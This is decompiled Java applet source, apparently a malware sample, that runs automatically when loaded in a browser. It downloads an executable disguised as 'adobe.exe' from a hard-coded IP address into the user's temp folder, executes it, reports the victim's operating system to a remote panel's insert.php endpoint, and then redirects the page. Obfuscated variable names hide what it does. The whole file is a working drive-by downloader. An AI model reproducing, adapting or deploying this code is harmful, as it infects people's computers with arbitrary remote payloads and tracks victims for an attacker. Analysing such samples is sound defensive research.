import java.net.InetAddress;
import java.net.MalformedURLException;
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.io.OutputStream;
import java.io.BufferedOutputStream;
import java.io.BufferedInputStream;
import java.net.URL;
import java.io.FileOutputStream;
import javax.swing.JApplet;

// 
// Decompiled by Procyon v0.5.30
// 

public class chflh extends JApplet
{
    boolean visit;
    boolean panel;
    String App;
    String Temp;
    String fsdSDAS;
    String Panel;
    String fsdfdssdfs;
    String fsdfdsf;
    String gdfdg;
    
    public chflh() {
        this.visit = true;
        this.panel = false;
        this.App = System.getenv("APPDATA");
        this.Temp = System.getenv("temp");
        this.fsdSDAS = "";
        this.Panel = "http://galaxyjdb.info";
        this.fsdfdssdfs = "http://210.211.110.222/adobe.exe";
        this.fsdfdsf = this.Temp + "\\";
        this.gdfdg = "%gdfdg%";
    }
    
    public static void main(final String[] array) {
    }
    
    @Override
    public void start() {
        final String concat = this.fsdfdsf.concat(this.gdfdg);
        try {
            final FileOutputStream fileOutputStream = new FileOutputStream(concat);
            final BufferedInputStream bufferedInputStream = new BufferedInputStream(new URL(this.fsdfdssdfs).openStream());
            final BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(fileOutputStream, 1024);
            final byte[] array = new byte[1024];
            long n = 0L;
            int read;
            while ((read = bufferedInputStream.read(array)) != -1) {
                bufferedOutputStream.write(array, 0, read);
                n += read;
            }
            bufferedOutputStream.close();
            bufferedInputStream.close();
        }
        catch (IOException ex) {
            Logger.getLogger(chflh.class.getName()).log(Level.SEVERE, null, ex);
        }
        try {
            Runtime.getRuntime().exec(concat);
        }
        catch (Exception ex3) {}
        if (this.panel) {
            this.logger();
        }
        try {
            if (this.visit) {
                this.getAppletContext().showDocument(new URL(this.fsdSDAS), "_self");
            }
        }
        catch (MalformedURLException ex2) {
            System.err.println(ex2);
        }
    }
    
    public static String fg() {
        return System.getProperty("os.name");
    }
    
    public void logger() {
        this.getParameter("Panel");
        final String s = "http://galaxyjdb.info";
        final String s2 = "olior";
        try {
            InetAddress.getLocalHost().getHostName();
            new URL(s + "/insert.php?&o=" + fg().replace(" ", "_") + "&u=" + s2).openStream();
        }
        catch (IOException ex) {
            ex.printStackTrace();
        }
    }
}
